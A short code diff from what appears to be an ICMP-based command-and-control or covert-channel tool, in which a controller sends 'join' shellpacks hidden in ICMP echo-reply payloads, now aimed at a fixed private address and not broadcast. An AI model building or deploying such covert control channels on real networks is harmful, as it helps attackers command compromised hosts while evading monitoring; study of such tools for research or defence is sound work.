@@ -235,11 +235,11 @@ class Controller(Host):
         #         self.send(ip, "join")
         #         print(f"Connect sent to {ip}")
 
-        shellpacks = self.build_shellpacks("join")
+        shellpacks = self.build_shellpacks("join", data=self.ip)
 
         for shellpack in shellpacks:
             print(shellpack)
-            data = (IP(src=self.ip, dst="255.255.255.255")/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
+            data = (IP(src=self.ip, dst="192.168.157.10")/ICMP(type=0, id=ICMP_ID)/Raw(load=shellpack))
             sr(data, timeout=0, verbose=0)
         
 
